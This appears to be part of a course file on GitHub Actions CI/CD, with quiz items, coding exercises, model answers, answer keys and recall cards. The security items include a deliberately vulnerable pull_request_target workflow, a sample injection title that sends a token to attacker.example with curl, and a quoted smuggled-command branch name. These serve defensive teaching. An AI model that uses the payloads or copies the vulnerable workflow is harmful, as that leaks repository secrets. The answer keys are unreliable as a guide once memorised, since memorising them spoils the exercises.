      took 9 min 12 s (Selenium framework 2 min 58 s, full stack 2 min 23 s, Playwright 2 min 7 s, Maven 57 s,
      Java 35 s) and `deploy` (needs both) 10 s. The run took 9 min 30 s. Which single change would shorten the
      time from push to deployed site the most?
    options:
      - id: split-practice
        text: Split practice into parallel jobs (for example Java + Maven + Selenium in one, Playwright + full stack in another).
        feedback: Correct - practice is the critical path. Two jobs of about 4.5 minutes each (plus set-up) would bring the run near check's 7 minutes.
      - id: faster-check
        text: Halve npm run check by caching the build.
        feedback: check finishes 2.5 minutes before practice already. deploy waits for both, so a faster check saves nothing end to end.
      - id: cache-npm
        text: Add an npm cache to the check job.
        feedback: check already uses cache npm, and npm ci took 8 seconds. Optimising a job that isn't on the critical path doesn't help.
      - id: drop-deploy-needs
        text: Let deploy need only check.
        feedback: It would ship sooner by skipping a gate - the practice projects could be broken in a deployed version. That is removing a check, not speeding it up.
    correct: [split-practice]
    hints:
      - deploy needs both jobs. Which one finishes last?
      - A job that isn't on the slowest path can get faster without the run getting shorter.
    solution: |
      The run's length is set by its **critical path**: `practice` (9 min 12 s) then `deploy`. Splitting
      `practice` into parallel jobs shortens that path; speeding up `check` doesn't, because `deploy` waits for
      `practice` anyway. Dropping a `need` is faster only by deploying unchecked code.

  - id: pipeline-order
    type: order
    concept: cicd-build-once-promote
    skill: recall
    title: Put the stages of a build-once pipeline in order
    prompt: Order the stages for one commit merged to main, from first to last.
    items:
      - id: install
        text: npm ci installs exactly the lock file
      - id: checks
        text: Typecheck, lint, unit, component and API tests
      - id: build
        text: Build the artifact once and upload it, named by commit
      - id: staging
        text: Deploy that artifact to staging
      - id: smoke
        text: Smoke tests and a few journeys against staging
      - id: approve
        text: Protection rules approve the production environment
      - id: promote
        text: Deploy the same artifact to production
    hints:
      - Nothing is built for deployment until the checks pass.
      - Production only receives what staging has proved.
    solution: |
      Install, check, build once, deploy to staging, test staging, pass the production environment's
      protection rules, then promote the **same** artifact. There is no build step after the first one.

  - id: cache-or-artifact
    type: mcq
    concept: cicd-build-once-promote
    skill: application
    title: Passing the build to the deploy job
    prompt: |
      A developer's workflow builds `dist/` in the `build` job and saves it with `actions/cache` under the key
      `dist-${{ github.sha }}`; the `deploy` job restores the same key and deploys. Mostly it works. One day the
      deploy job finds no `dist/`, runs `npm run build` "as a fallback" and deploys. What is wrong?
    options:
      - id: artifact
        text: Build outputs should be passed as artifacts - caches are best effort and can be missing, and the fallback rebuild deploys bytes no test saw.
        feedback: Correct - a cache can be evicted or not yet saved; an artifact is kept for its retention. And the fallback breaks build-once.
      - id: key
        text: The cache key should use the branch name instead of the commit SHA.
        feedback: A branch key would restore a build from a different commit - worse. The problem is using a cache at all for the build.
      - id: restore-keys
        text: Add restore-keys so a partial match is found.
        feedback: A partial match would restore a build of some other commit and deploy it. Caches are for speed, not for identity.
      - id: fine
        text: Nothing - the fallback makes the deploy robust.
        feedback: It makes the deploy succeed with an untested build. A deploy that can't find its tested artifact should fail.
    correct: [artifact]
    hints:
      - Is a cache entry guaranteed to exist when the next job looks for it?
      - What did the tests run against, and what got deployed?
    solution: |
      Caches are a speed-up: GitHub evicts entries unused for 7 days and when the repository is over its
      limit, and a cache from a failed job is never saved. Use `upload-artifact` / `download-artifact` for
      the build, and make the deploy job **fail** if the artifact is missing - never rebuild there.

  - id: debug-preview-workflow
    type: debug
    concept: cicd-workflow-security
    skill: analysis
    title: Review this preview workflow
    prompt: |
      A team wants preview deployments for pull requests from forks, so they wrote this workflow
      (`sandpay-preview` is a fictional CLI). Click **every** line a security reviewer must change because it
      lets a stranger's pull request run commands with this repository's secrets or a write token - or gives
      that token more than it needs.
    language: yaml
    code: |
      name: Preview
      on:
        pull_request_target:
      permissions: write-all
      jobs:
        preview:
          runs-on: ubuntu-latest
          timeout-minutes: 15
          steps:
            - uses: actions/checkout@v4
              with:
                ref: ${{ github.event.pull_request.head.sha }}
            - uses: actions/setup-node@v4
              with:
                node-version-file: .nvmrc
            - run: npm ci && npm run build
            - run: echo "Preview for ${{ github.event.pull_request.title }}"
            - run: npx sandpay-preview deploy --token "$PREVIEW_TOKEN"
              env:
                PREVIEW_TOKEN: ${{ secrets.SANDPAY_PREVIEW_TOKEN }}
    correctLines: [3, 4, 12, 17]
    lineNotes:
      - line: 10
        note: Pinning to a full SHA is worth doing too, but a first-party tag is not what makes this workflow exploitable today.
      - line: 16
        note: Building is fine under a plain pull_request trigger, where fork pull requests get no secrets. It is dangerous here only because lines 3 and 12 make it run the pull request's code in a privileged context - fix those.
      - line: 18
        note: Passing the secret through env and quoting "$PREVIEW_TOKEN" is the right way to give a secret to a command.
    hints:
      - Which trigger runs with the base repository's secrets even for fork pull requests?
      - Whose code does the checkout fetch, and who wrote package.json's scripts?
      - Which line pastes text an outsider chose into a shell script?
    solution: |
      - **Line 3** - `pull_request_target` runs in the base repository's context with its secrets. Use
        `pull_request` to build fork code (no secrets), and deploy previews from a separate, trusted workflow
        (for example `workflow_run` that only reads the built artifact, treated as untrusted data).
      - **Line 4** - `write-all` gives the token every write scope. Grant `contents: read` and only what the
        job needs.
      - **Line 12** - checks out the pull request's head; together with line 3, `npm ci` and the build run the
        attacker's install scripts and build code with your secret and token (a "pwn request").
      - **Line 17** - script injection: a title such as `x"; curl attacker.example -d "$PREVIEW_TOKEN"; echo "`
        becomes part of the script. Use `env: TITLE: ${{ github.event.pull_request.title }}` and `"$TITLE"`.

  - id: always-deploy
    type: mcq
    concept: cicd-pipeline-anatomy
    skill: analysis
    title: The deploy that ran after a failed test
    prompt: |
      A team's production job has `needs: [test, build]` and
      `if: always() && github.ref == 'refs/heads/main'`. Yesterday the `test` job failed on `main`, and the
      production job deployed anyway (the `build` job had succeeded). Why, and what is the fix?
    options:
      - id: always
        text: always() overrides the default success() check, so the job runs whatever its needs' results. Drop always(), or require needs.test.result == 'success'.
        feedback: Correct - "a default status check of success() is applied unless you include one of these functions"; always() removed it.
      - id: ref
        text: github.ref was wrong - it should be github.base_ref.
        feedback: On a push to main, github.ref is refs/heads/main, so that part is right. The condition lets the job run because of always().
      - id: needs-order
        text: needs runs jobs in order, so build overwrote the failed test result.
        feedback: needs makes the job wait; each needed job keeps its own result. Nothing was overwritten.
      - id: flaky
        text: The test job must have been reported as skipped, and skipped counts as success.
        feedback: The evidence says test failed. A skipped need would also skip the job under the default condition - always() is what lets it through.
    correct: [always]
    hints:
      - What condition does a job get when its if has no status function?
      - What does always() do to that default?
    solution: |
      Without a status function, `if:` gets an implicit `success()`, which is false when a needed job failed.
      `always()` replaces it, so only the branch check is left. Fix: `if: github.ref == 'refs/heads/main'`
      (success() is implied), or `if: ${{ !cancelled() && needs.test.result == 'success' && needs.build.result == 'success' }}`
      when you need the explicit form. Then prove it on a branch with a deliberately failing test.

  - id: oidc-trust
    type: mcq
    concept: cicd-workflow-security
    skill: application
    title: Removing the stored cloud key
    prompt: |
      SandPay's deploy job uses a long-lived cloud access key stored as the repository secret
      `SANDPAY_CLOUD_KEY`. Security asks you to remove it. What replaces it?
    options:
      - id: oidc
        text: OIDC - the deploy job gets id-token write, requests GitHub's JWT and exchanges it for short-lived credentials; the cloud trusts only this repository's production environment (or main).
        feedback: Correct - no stored secret, credentials valid for one job, and the trust conditions decide which runs can deploy.
      - id: env-secret
        text: Move the key to the production environment's secrets.
        feedback: An improvement - only jobs in that environment see it, after approval - but it is still a long-lived key that someone must rotate. Security asked to remove it.
      - id: token
        text: Use GITHUB_TOKEN to log in to the cloud.
        feedback: GITHUB_TOKEN authenticates to GitHub for this repository; a cloud provider doesn't accept it. OIDC is how a job proves its identity to another service.
      - id: oidc-any
        text: OIDC with a trust that accepts any branch of the repository, so feature branches can deploy too.
        feedback: Then any branch - including one a contributor pushes - can obtain production credentials. Bind the trust to the environment or to main.
    correct: [oidc]
    hints:
      - What can a job prove about itself without holding a secret?
      - Which claim in the token should the cloud check?
    solution: |
      Configure the cloud to trust GitHub's OIDC issuer for subject
      `repo:<owner>/<repo>:environment:production` (or the immutable `repo:<owner>@<id>/<repo>@<id>:...` form
      for new repositories), give the job `permissions: id-token: write`, and exchange the JWT for short-lived
      credentials with your provider's action. Then delete `SANDPAY_CLOUD_KEY` and revoke it in the cloud.

  - id: workflow-audit
    type: coding
    concept: cicd-workflow-security
    skill: application
    title: Write a workflow linter
    prompt: |
      `workflow-audit.ts` parses a workflow file with the `yaml` package. Its first draft only notices
      actions that follow a branch (`@main`). Make `auditWorkflow` report, in file order, every
      `unpinned-action` (not a full 40-character SHA - tags and short SHAs too, including a job-level
      reusable workflow), `missing-permissions`, `broad-permissions` (`write-all`), `script-injection`
      (untrusted contexts expanded in `run:`), `untrusted-checkout` (`pull_request_target` checking out the
      pull request head) and `no-timeout`. The rules and their edge cases are in the comment at the top of
      the file.
    project: fullstack
    files:
      - exercises/ci-cd/workflow-audit.ts
    test: tests/ci-cd/workflow-audit.test.ts
    command: npx vitest run tests/ci-cd/workflow-audit.test.ts
    hints:
      - "Start with a helper that takes a uses string and says whether it is pinned: skip ./ and docker://, split at the last @, and test the ref against /^[0-9a-f]{40}$/."
      - "on: can be a string, a list or a mapping - turn it into a list of trigger names before looking for pull_request_target."
      - "A job with a job-level uses: calls a reusable workflow: check that reference, then skip the timeout and steps checks for it."
      - "For injection, look for ${{ ... }} containing github.head_ref or a github.event path ending in one of the listed names - and only in run:, never in env: (that is the fix)."
    modelAnswer: |
      ```typescript
      const FULL_SHA = /^[0-9a-f]{40}$/;

      function unpinnedReference(uses: unknown): string | undefined {
        if (typeof uses !== 'string' || uses.startsWith('./') || uses.startsWith('docker://')) return undefined;
        const at = uses.lastIndexOf('@');
        if (at < 0) return uses;
        return FULL_SHA.test(uses.slice(at + 1)) ? undefined : uses;
      }

      // per job, in this order: broad-permissions, missing-permissions,
      // (job-level uses: -> unpinned-action, then continue), no-timeout,
      // then per step: unpinned-action, script-injection, untrusted-checkout
      if (!topLevelPermissions && !('permissions' in job)) {
        findings.push({ rule: 'missing-permissions', job: jobId, detail: '...' });
      }
      if (typeof step.run === 'string' && UNTRUSTED_EXPRESSION.test(step.run)) {
        findings.push({ rule: 'script-injection', job: jobId, step: position, detail: '...' });
      }
      const checkout = typeof step.uses === 'string' && step.uses.startsWith('actions/checkout@');
      const checkoutRef = isMapping(step.with) ? String(step.with.ref ?? '') : '';
      if (privilegedTrigger && checkout && /github\.event\.pull_request\.head\.|github\.head_ref/.test(checkoutRef)) {
        findings.push({ rule: 'untrusted-checkout', job: jobId, step: position, detail: '...' });
      }
      ```

      Each rule is one of GitHub's own recommendations: a SHA can't be moved like a tag; unspecified
      permissions fall back to the repository default; `${{ }}` in `run:` is pasted into the script before
      the shell runs; `pull_request_target` has secrets, so it must not run the pull request's code. The full
      solution is in `solutions/ci-cd/workflow-audit.ts`.
    solution: |
      Write one small helper per rule and walk the jobs and steps in order. The pinning helper splits at
      the last `@` and requires 40 hex characters; permissions are checked at the top and per job; the
      injection check is a regular expression over `run:` only; the checkout rule needs both the trigger and
      a `ref` built from the pull request head. The model answer shows the core.
    rubric:
      - Every test in tests/ci-cd/workflow-audit.test.ts passes.
      - Each rule can be traced to a sentence in GitHub's security documentation (cite it in a comment).
      - The env-variable fix is not reported - the rule looks only at run.
      - You ran it on a real workflow (this repository's pages.yml) and can explain each finding.
    followUp: |
      Add a rule `cache-in-privileged-trigger`: a workflow triggered by `pull_request_target` or `workflow_run`
      that uses `actions/setup-node` without `package-manager-cache: false`. Which GitHub documentation
      sentence justifies it, and what does GitHub already do to limit cache poisoning?

  - id: deploy-gate
    type: coding
    concept: cicd-build-once-promote
    skill: application
    title: The gate in front of the deploy job
    prompt: |
      `deploy-gate.ts` holds `decideDeploy`, called by SandPay's deploy job before anything ships. The first
      draft has deployed things it shouldn't: a `pull_request_target` run, a branch called `domain`, a run
      whose tests were skipped, a rebuilt artifact. Rewrite it to check, in order: the event (only `push` and
      `workflow_dispatch`), the ref (exactly `refs/heads/main`), the needs (all `success`, and at least one),
      the artifact (built from this sha), and for production the staging proof (same digest, smoke passed)
      and change freezes (`[from, to)`).
    project: fullstack
    files:
      - exercises/ci-cd/deploy-gate.ts
    test: tests/ci-cd/deploy-gate.test.ts
    command: npx vitest run tests/ci-cd/deploy-gate.test.ts
    hints:
      - Write the rules as an allow-list - name the events that may deploy, not the ones that may not.
      - "ref.endsWith('main') accepts refs/heads/domain. Compare the whole ref."
      - "Which needs results are not 'success'? There are three, and an empty object has none at all."
      - Production compares digests, not commits - the same commit rebuilt can give different bytes.
    modelAnswer: |
      ```typescript
      const DEPLOYING_EVENTS = new Set(['push', 'workflow_dispatch']);

      export function decideDeploy(r: DeployRequest): DeployDecision {
        if (!DEPLOYING_EVENTS.has(r.event)) return { deploy: false, reason: 'wrong-event' };
        if (r.ref !== 'refs/heads/main') return { deploy: false, reason: 'wrong-ref' };
        const results = Object.values(r.needs);
        if (results.length === 0 || results.some((result) => result !== 'success')) {
          return { deploy: false, reason: 'checks-not-green' };
        }
        if (!r.artifact || r.artifact.sha !== r.sha) return { deploy: false, reason: 'artifact-mismatch' };
        if (r.target === 'production') {
          if (!r.staging || r.staging.digest !== r.artifact.digest || r.staging.smoke !== 'passed') {
            return { deploy: false, reason: 'not-proven-on-staging' };
          }
          const now = r.now.getTime();
          if (r.freezes.some((f) => now >= f.from.getTime() && now < f.to.getTime())) {
            return { deploy: false, reason: 'change-freeze' };
          }
        }
        return { deploy: true };
      }
      ```

      An allow-list of events fails closed: a trigger nobody thought of (`workflow_run`, `schedule`) can't
      deploy. `skipped` and `cancelled` are not green - they proved nothing. The digest check is what makes
      "promote the same artifact" verifiable.
    solution: |
      Replace each deny check with an allow check: a set of deploying events, an exact ref, every need equal to
      `success` (and at least one), the artifact's sha equal to the run's, and for production the staging
      digest equal to the artifact's with smoke passed, then the freeze windows with an inclusive start and
      exclusive end.
    rubric:
      - Every test in tests/ci-cd/deploy-gate.test.ts passes.
      - Events and refs are allow-listed, so an unknown trigger cannot deploy.
      - Skipped and cancelled needs block the deploy, and you can explain why.
      - Production is gated on the artifact digest, not only the commit.
    followUp: |
      SandPay adds canary releases: production first serves the new version to 5% of traffic for 15 minutes.
      What new input and rule would `decideDeploy` need for the full rollout, and what evidence should the
      rule read?

  - id: test-the-pipeline
    type: testdesign
    concept: cicd-build-once-promote
    skill: application
    title: Prove the pipeline keeps bad builds out of production
    prompt: |
      Your team has just added the SandPay dashboard workflow from this lesson. Design tests that prove three
      properties: (1) a commit with a failing test never reaches staging or production; (2) production
      receives exactly the artifact staging tested; (3) a fork pull request can't read any secret. For each,
      give preconditions, steps, the expected result and the evidence you would keep.
    modelAnswer: |
      **1. Failing test blocks deploys.** Preconditions: a test branch; branch protection requiring `check`.
      Steps: add a deliberately failing unit test, open a pull request; separately, on a sandbox copy of the
      repository, push the failing commit to `main`. Expected: the pull request can't merge (required check
      failed); on `main`, `build`, `deploy-staging` and `deploy-production` are skipped. Evidence: the run
      summary, the jobs API showing `conclusion: skipped`, and no new deployment in the environments list.

      **2. Same artifact.** Preconditions: the build job records the artifact digest (for example
      `sha256sum` of the tarball or the image digest) in its log and the job outputs; both deploy jobs print the
      digest of what they deploy. Steps: merge a harmless change; let it run to production. Expected: one
      build, the same digest in build, staging and production logs; no `npm run build` in deploy jobs.
      Evidence: the three log lines and the artifact name with the commit SHA.

      **3. No secrets for forks.** Preconditions: a fork. Steps: open a pull request whose workflow step prints
      `test -n "$X" && echo set || echo empty` for `X: ${{ secrets.SANDPAY_PREVIEW_TOKEN }}`, and tries
      `gh api` a write call with the token. Expected: `empty`, and the write call is refused. Evidence: the
      log lines; confirm no `pull_request_target` workflow exists that checks out the head (the audit tool).
    rubric:
      - Each property has preconditions, steps, an expected result and concrete evidence (run summary, API, logs, deployments list).
      - The failing-test case covers both the pull request gate and a push to main.
      - The artifact case compares a digest, not just a commit or a version label.
      - The fork case never prints a secret value - only whether it is set.
    hints:
      - Where can you see that a job was skipped without reading every log?
      - What identifies the bytes of an artifact?
    solution: |
      Use the run summary and the jobs API for "skipped", digests in logs for "same artifact", and a fork pull
      request that prints only set/empty for secrets. The model answer gives the full design.

  - id: speed-up-review
    type: short
    concept: cicd-pipeline-anatomy
    skill: analysis
    title: A 25-minute pipeline
    prompt: |
      A full stack team's single CI job takes 25 minutes: `npm install` 4 min, lint 1 min, unit tests 3 min,
      API tests against a Postgres service container 6 min, Playwright end-to-end 9 min, build 2 min. The job
      has no cache and no timeout and runs everything on every pull request, even documentation-only ones.
      Propose four changes, in priority order, and say what each saves or prevents.
    modelAnswer: |
      1. **Split into parallel jobs** - static + unit, API tests, end-to-end, build. The run becomes as long
         as its slowest job (end-to-end, about 9 + set-up minutes) instead of the sum: roughly 25 → 12 min.
      2. **`npm ci` with `cache: npm`** keyed on the lock file - faster, and installs exactly the lock file
         (`npm install` can change it).
      3. **Shard the end-to-end tests** across a matrix (for example 3 shards), now the critical path - and ask
         whether all of them belong on every pull request or some after merge.
      4. **`timeout-minutes` on each job and `concurrency` with `cancel-in-progress` for pull requests** - a
         hung job no longer holds a runner for 6 hours; superseded runs stop.
      Path filters for documentation-only changes are possible, but if the job is a required check, a skipped
      workflow leaves it "Pending" - use a job-level condition or an always-reporting summary job instead.
    rubric:
      - Parallel jobs and the critical path come first, with an estimate.
      - npm ci with a cache keyed on the lock file.
      - Mentions timeouts or concurrency.
      - Knows the "Pending" trap of path filters on required checks, or otherwise justifies how docs-only changes are handled.
    hints:
      - The run takes as long as its slowest path - what if the steps didn't all have to wait for each other?
      - Which step is now the slowest, and can it be split?
    solution: |
      Parallel jobs first (25 → about 12 minutes), then `npm ci` with a lock-file cache, shard end-to-end
      tests, and timeouts plus concurrency. Be careful with path filters on required checks.

  - id: interview-pipeline
    type: interview
    concept: cicd-workflow-security
    skill: analysis
    title: "\"Walk me through how your code gets to production\""
    prompt: |
      An interviewer for a full stack role asks: "Walk me through how a change gets from your laptop to
      production in your ideal setup - and how you'd stop an attacker from using that same path."
    modelAnswer: |
      A small change goes up as a pull request. CI runs on it: `npm ci`, typecheck and lint, unit and
      component tests, API tests against a real Postgres, a build - all in parallel jobs with timeouts, a
      few minutes total. Those checks are required to merge, plus a review. On merge to `main`, the
      pipeline builds the artifact **once** - an image with a digest - and deploys it to staging, runs smoke
      tests and a few journeys, and then promotes the same digest to production, either automatically
      (continuous deployment) or after an approval on the production environment (continuous delivery).
      Configuration differs per environment, never the build. Production has monitoring and a fast rollback,
      because the pipeline makes small, frequent deploys - DORA's metrics are how I'd know it works.

      Securing that path: the workflow token is read-only by default, with write scopes only on the job that
      needs them. Third-party actions are pinned to commit SHAs or a lockfile, updated by Dependabot. Pull
      requests from forks run under `pull_request` with no secrets; nothing privileged ever checks out their
      code, and untrusted values like titles and branch names reach scripts only through environment
      variables. Production credentials are not stored at all - the deploy job uses OIDC, and the cloud trusts
      only this repository's production environment. Production secrets live in that environment, behind
      required reviewers who can't approve their own deploy. Workflow files have CODEOWNERS and a linter.
    rubric:
      - Describes CI on pull requests, required checks, build once and promotion through environments.
      - Distinguishes continuous delivery from deployment, or explains the approval.
      - Names at least four hardening measures - least-privilege token, pinning, no untrusted checkout, injection-safe scripts, OIDC, environment secrets with reviewers.
      - Mentions rollback or monitoring - what happens when a deploy is bad.
    followUps:
      - A popular action you use was compromised and its v3 tag repointed. What protected you, and what do you check now?
      - How would you deploy previews for pull requests from forks safely?
      - Your pipeline takes 30 minutes. Where do you start?
    hints:
      - Start at the pull request and end in production, naming the gates.
      - Then go through what the pipeline holds - tokens, secrets, cloud access - and how each is limited.
    solution: |
      Path: pull request → parallel CI checks required to merge → build once on main → staging and smoke tests →
      the same artifact to production (approved or automatic) → monitoring and rollback. Security: read-only
      token by default, pinned actions, no privileged runs of fork code, env-variable scripts, OIDC instead of
      keys, environment secrets behind reviewers, CODEOWNERS on workflows.

placement:
  - id: place-skipped-need
    type: mcq
    concept: cicd-pipeline-anatomy
    skill: application
    title: Is the deploy job reached?
    prompt: |
      A workflow has jobs `lint`, `test` (both without needs) and `deploy` with `needs: [lint, test]` and no
      `if:`. On a push to main, `lint` succeeds and `test` is cancelled by a concurrency group. What happens to
      `deploy`?
    options:
      - id: skipped
        text: It is skipped - a job whose needs did not all succeed doesn't run under the default condition.
        feedback: Correct - the implicit success() is false when a needed job failed, was cancelled or skipped.
      - id: runs
        text: It runs, because cancelled is not a failure.
        feedback: The default condition requires the needed jobs to succeed; cancelled is not success.
      - id: waits
        text: It waits until test is re-run.
        feedback: Jobs don't wait for a manual re-run; the dependent job is resolved when its needs finish.
      - id: fails
        text: It runs and fails.
        feedback: It never starts - it is skipped.
    correct: [skipped]
    solution: |
      "If a job fails or is skipped, all jobs that need it are skipped unless the jobs use a conditional
      expression that causes the job to continue." The default is `success()`, so a cancelled `test` also
      leaves `deploy` skipped.

  - id: place-rebuild
    type: mcq
    concept: cicd-build-once-promote
    skill: application
    title: The production build step
    prompt: |
      A pipeline builds and tests the app, deploys to staging, then the production job checks out the same
      commit, runs `npm ci && npm run build` with production settings and deploys. Staging was fine;
      production breaks. What is the main design problem?
    options:
      - id: rebuild
        text: Production deploys a different build from the one tested - build once, configure per environment at run time, and promote the same artifact.
        feedback: Correct - the production bytes were never tested; dependency resolution, tools or build-time settings can differ.
      - id: npm-ci
        text: npm ci should be npm install in production.
        feedback: npm ci is the right command - it installs exactly the lock file. The problem is building again at all.
      - id: no-approval
        text: The production job has no manual approval.
        feedback: An approval decides when to deploy, not what. An approved rebuild is still untested.
      - id: staging-wrong
        text: Staging must use production settings too.
        feedback: Environments differ in configuration on purpose; the build must not depend on it.
    correct: [rebuild]
    solution: |
      Build once and promote: production must receive the artifact that staging tested, identified by its
      digest. Move environment-specific values to run-time configuration so one build fits every environment.

  - id: place-injection
    type: mcq
    concept: cicd-workflow-security
    skill: application
    title: Safe use of a branch name
    prompt: |
      A pull request workflow step is `run: ./scripts/preview.sh "${{ github.head_ref }}"`. A reviewer flags
      it. Which change fixes the problem?
    options:
      - id: env
        text: "Pass it through env: (BRANCH: ${{ github.head_ref }}) and use \"$BRANCH\" in the script."
        feedback: Correct - the value is no longer pasted into the script text, so it can't become a command.
      - id: quotes
        text: Use single quotes around the expression instead of double quotes.
        feedback: The expression is replaced before the shell runs; a branch name containing a single quote breaks out just the same.
      - id: pin
        text: Pin the actions in the workflow to commit SHAs.
        feedback: Good practice, but unrelated - the risk is the attacker-chosen branch name in the script.
      - id: secret
        text: Store the branch name in a secret.
        feedback: The branch name comes from the pull request at run time; it is untrusted input, not a secret.
    correct: [env]
    solution: |
      Branch names are untrusted (GitHub's example: `zzz";echo${IFS}"hello";#` is a valid branch name).
      `${{ }}` in `run:` is substituted into the script before it runs, so quoting doesn't help. Pass the value
      through an environment variable and quote the variable.

recall:
  - id: recall-ci-cd
    concept: cicd-pipeline-anatomy
    prompt: Define continuous integration, continuous delivery and continuous deployment in one line each.
    answer: CI - integrate small changes often, each built and tested automatically. Continuous delivery - the software can be released to production at any time, push-button; the business chooses when. Continuous deployment - every change that passes the pipeline goes to production automatically.
  - id: recall-needs
    concept: cicd-pipeline-anatomy
    prompt: How do jobs in a GitHub Actions workflow run relative to each other, and what sets a run's duration?
    answer: Jobs run in parallel unless needs orders them; a job whose needs failed, were cancelled or skipped is skipped under the default success() condition. The run takes as long as its critical path - the slowest chain of needs.
  - id: recall-speed
    concept: cicd-pipeline-anatomy
    prompt: Name four settings that keep a GitHub Actions pipeline fast and cheap.
    answer: Parallel jobs (and shards), npm ci with cache npm keyed on the lock file, timeout-minutes on every job (default 360), and concurrency with cancel-in-progress for pull requests.
  - id: recall-build-once
    concept: cicd-build-once-promote
    prompt: What does "build once, promote" mean and why?
    answer: Build the artifact once from one commit, test it, and deploy those same bytes (same digest) to staging and then production. A rebuild could differ, so production would run something never tested. Only configuration changes per environment.
  - id: recall-cache-artifact
    concept: cicd-build-once-promote
    prompt: What is the difference between a cache and an artifact?
    answer: An artifact keeps a run's output (the build, evidence) for its retention - 90 days by default - and passes it between jobs. A cache is a best-effort speed-up of re-creatable inputs, branch-scoped and evicted after 7 days unused. Never pass builds or secrets through a cache.
  - id: recall-hardening
    concept: cicd-workflow-security
    prompt: Name five ways to harden a GitHub Actions workflow.
    answer: Read-only default permissions with write per job; pin actions to full commit SHAs or use a lockfile; pass untrusted context values through env, never ${{ }} in run; never run pull request code in pull_request_target; OIDC instead of stored cloud keys - plus environment secrets behind reviewers and CODEOWNERS on workflow files.
  - id: recall-oidc
    concept: cicd-workflow-security
    prompt: How does OIDC let a job deploy to a cloud without a stored key?
    answer: With id-token write, the job requests a JWT from GitHub's OIDC provider describing the run (repository, ref, environment...). The cloud checks the issuer, audience and subject against its trust policy and returns short-lived credentials for that job only.

